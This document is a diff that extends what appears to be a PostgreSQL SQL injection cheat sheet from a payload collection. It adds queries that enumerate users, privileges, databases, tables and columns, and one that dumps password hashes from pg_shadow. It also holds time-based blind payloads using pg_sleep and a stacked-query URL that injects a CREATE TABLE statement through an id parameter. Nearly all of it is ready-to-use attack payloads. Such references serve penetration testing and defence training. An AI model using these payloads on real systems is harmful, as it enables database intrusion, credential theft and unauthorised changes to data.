@@ -3,9 +3,19 @@
 ## Summary
 
 * [PostgreSQL Comments](#postgresql-comments)
+* [PostgreSQL version](#postgresql-version)
+* [PostgreSQL Current User](#postgresql-current-user)
+* [PostgreSQL List Users](#postgresql-list-users)
+* [PostgreSQL List Password Hashes](#postgresql-list-password-hashes)
+* [PostgreSQL List Privileges](#postgresql-list-privileges)
+* [PostgreSQL database name](#postgresql-database-name)
+* [PostgreSQL List databases](#postgresql-list-database)
+* [PostgreSQL List tables](#postgresql-list-tables)
+* [PostgreSQL List columns](#postgresql-list-columns)
 * [PostgreSQL Error Based](#postgresql-error-based)
 * [PostgreSQL Blind](#postgresql-blind)
 * [PostgreSQL Time Based](#postgresql-time-based)
+* [PostgreSQL Stacked query](#postgresql-stacked-query)
 * [PostgreSQL File Read](#postgresql-file-read)
 * [PostgreSQL File Write](#postgresql-file-write)
 * [PostgreSQL Command execution](#postgresql-command-execution)
@@ -18,6 +28,64 @@
 ```sql
 --
 /**/  
+```
+
+## PostgreSQL Version
+
+```sql
+SELECT version()
+```
+
+## PostgreSQL Current User	
+
+```sql
+SELECT user;
+SELECT current_user;
+SELECT session_user;
+SELECT usename FROM pg_user;
+SELECT getpgusername();
+```
+
+## PostgreSQL List Users
+
+```sql
+SELECT usename FROM pg_user
+```
+
+## PostgreSQL List Password Hashes
+
+```sql
+SELECT usename, passwd FROM pg_shadow 
+```
+
+## PostgreSQL List Privileges
+
+```sql
+SELECT usename, usecreatedb, usesuper, usecatupd FROM pg_user
+```
+
+## PostgreSQL Database Name
+
+```sql
+SELECT current_database()
+```
+
+## PostgreSQL List Database
+
+```sql
+SELECT datname FROM pg_database
+```
+
+## PostgreSQL List Tables
+
+```sql
+SELECT table_name FROM information_schema.tables
+```
+
+## PostgreSQL List Columns
+
+```sql
+SELECT column_name FROM information_schema.columns WHERE table_name='data_table'
 ```
 
 ## PostgreSQL Error Based
@@ -46,6 +114,14 @@
 ```sql
 AND [RANDNUM]=(SELECT [RANDNUM] FROM PG_SLEEP([SLEEPTIME]))
 AND [RANDNUM]=(SELECT COUNT(*) FROM GENERATE_SERIES(1,[SLEEPTIME]000000))
+```
+
+## PostgreSQL Stacked Query
+
+Use a semi-colon ";" to add another query
+
+```sql
+http://host/vuln.php?id=injection';create table NotSoSecure (data varchar(200));--
 ```
 
 ## PostgreSQL File Read
